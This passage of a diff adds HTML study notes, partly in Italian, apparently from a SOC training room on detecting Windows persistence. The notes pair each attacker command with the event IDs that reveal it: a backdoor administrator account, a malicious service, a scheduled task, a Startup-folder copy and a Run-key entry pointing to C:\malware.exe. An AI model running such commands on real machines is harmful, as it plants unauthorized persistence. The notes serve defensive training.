+CMD C:\> net localgroup Administrators "mr.backd00r" /add<br>
+PS  C:\> Add-LocalGroupMember "Administrators" -Member "mr.backd00r"</code><br><br>
+ </p>
+
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="BackdooredUsers">Detecting Backdoored Users</h2>
+    <p>It's time to go back to the <i>Security event logs!</i> Every user creation event is logged as Security event ID 4720, which you explored in the Windows Logging for SOC room. Since threat actors can be very creative with naming the backdoored accounts, you should not rely just on detecting suspicious names like "hacker" but rather investigate:</p>
+    <ul>
+        <li>Who created the account? Can the person confirm the account creation?</li>
+        <li>What is the source IP and time of the creator's login? Is it expected?</li>
+        <li>Which other suspicious events can you see in the creator's session?</li>
+    </ul>
+    <p><b>Making Users Privileged: </b> Next, a new user by itself won't give the attacker much, as the default user permissions do not allow remote (RDP) logins or grant administrative privileges on the machine. To overcome this, threat actors will add their backdoored account to one of the privileged groups, which is tracked by Security event ID 4732. The most commonly exploited groups are Administrators and Remote Desktop Users.</p>
+    <p><b>Resetting Passwords: </b>Lastly, in more advanced cases, threat actors may simply reset the password of some old or unused account and use it instead of creating a new one. You can detect it with Security event ID 4724.<br><br>
+<code>4720: a user account was created  |  4732: A member was added to a security group  |  4724: An attempt to reset an account's password</code><br>
+</p>
+<code>(filter ID 4624 / 4625 per sapere quanti successful/failed log )</code>
+
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="PersTaskServ">Persistence: Tasks and Services</h2>
+    <p><b>Malware Persistence:</b>Persistence via a backdoored user works well if you can remotely log in to it via RDP, but if the attack started through a phishing attack or USB infection, that's not an option. For these scenarios, threat actors need an actively running malware that maintains a connection with their C2 server even after a system reboot. How could they achieve malware persistence? </p>
+    <p><b>Services and Tasks:</b>you don't need to know all of them, but let's start with the two common ones:<br>
+        <b>Create a Windows Service</b> (Runs after OS startup)	 <code>sc create "BadService" binpath= "C:\malware.exe" start= auto</code>  --> Launch of sc.exe: Sysmon / 1 , Service creation: Security / 4697 <br><br>
+        <b>Create a Scheduled Task</b> (Run after OS startup)	<code>schtasks /create /tn "BadTask" /tr "C:\malware.exe" /sc onstart /ru System</code>  --> Launch of schtasks.exe: Sysmon / 1 , Scheduled task creation: Security / 4698 <br><br>
+  </p>
+  <h3>Detecting Services</h3>
+  <p>Many critical Windows components like DNS client or Security Center are services. You can view services by launching services.msc or searching for "Services", but you need administrative privileges and the sc.exe command to create or modify one.
+<br>
+Threat actors can create their own malicious services that will run the specified program on startup, and they do it very often, as you can read in the MITRE examples (https://attack.mitre.org/techniques/T1543/003/#:~:text=Procedure%20Examples) . In logs, you can detect malicious services in three ways:
+</p>
+<ol>
+    <li>Detect the launch of the sc.exe create command via Sysmon event ID 1</li>
+    <li>Detect service creation via Security event ID 4697 or System event ID 7045</li>
+    <li>Detect suspicious processes with a services.exe parent process</li>
+</ol>
+<p>(ID 7045:<br>
+Event ID 7045: A new service was installed in the system.<br>
+Description	A new service was installed by the user indicated in the subject. Subject often identifies the local system (SYSTEM) for services installed as part of native Windows components and therefore you can't determine who actually initiated the installation.<br>
+Category	System<br>
+Subcategory	Security system extension<br>
+)</p>
+  <h3>Detecting Tasks</h3>
+<p>Scheduled tasks are another Windows feature heavily used by both the OS and external apps (e.g. to check for updates or make a backup every hour). From GUI, you can manage tasks by launching taskschd.msc or searching for "Task Scheduler". From the command line, you can use the schtasks.exe command.
+
+Unlike services, scheduled tasks are very easy to configure and hide, which is why they are the most common persistence method by threat actors, like in these APT28 and APT41 attacks. Similar to services, you can detect scheduled tasks in three ways:
+</p>
+<ol>
+    <li>Detect the launch of the schtasks.exe /create command via Sysmon event ID 1</li>
+    <li>Detect and analyze scheduled task creation events via Security event ID 4698</li>
+    <li>Detect suspicious processes with a svchost.exe [...] -s Schedule parent</li>
+</ol><br>
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+    <h2 id="PersRunKeyStartup">Persistence: Run keys and Startup</h2>
+    <p>Services and scheduled tasks are typically run on system boot and require administrative privileges to configure. However, what if a program has to run only when a specific user logs in? For such cases, Windows provides a few per-user persistence methods that are actively used by both legitimate tools and malware:<br>
+    <b>Add malware to Startup Folder</b> (Runs upon user login)	  <code>copy C:\malware.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\malware.exe"</code> --> New startup item: Sysmon Event ID 11 <br><br>
+    <b>Add malware to "Run" keys</b> (Runs upon user login)	 <code>reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v BadKey /t REG_SZ /d "C:\malware.exe"</code> --> New registry value: Sysmon Event ID 13<br><br>
+    </p>
+    <p><b>Detecting Startup:</b> The startup folder was meant to be an easy way for inexperienced users to configure programs to run on login. You simply open the startup folder, move your program or program shortcut there, and see how it automatically starts upon your future logins. You can access your startup folder via the path below: <br>
+        <code>C:\Users\< USER >\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</code> <br>
+        Or for all users: <code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code><br>
+        The startup folder is not a common choice for legitimate programs, so usually, the folder is empty. Still, threat actors often put their malware there </p>
+    <p><b>Detecting Run Keys:</b> Run key persistence is very similar to the startup folder; they even share a single MITRE technique! The only major difference is how the entries are added there. Instead of just copying the program to the startup folder, you need to create a new value in the "Run" Windows registry and put the path to your program there:<br>
+    <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</code> <br>
+    Or for all users: <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run</code><br>
+    </p>
+
+    <a href="#inizio"  class="button-link">Torna all'indice!</a>
+    <hr>
+  
+</div>
+
+</body>
+</html>
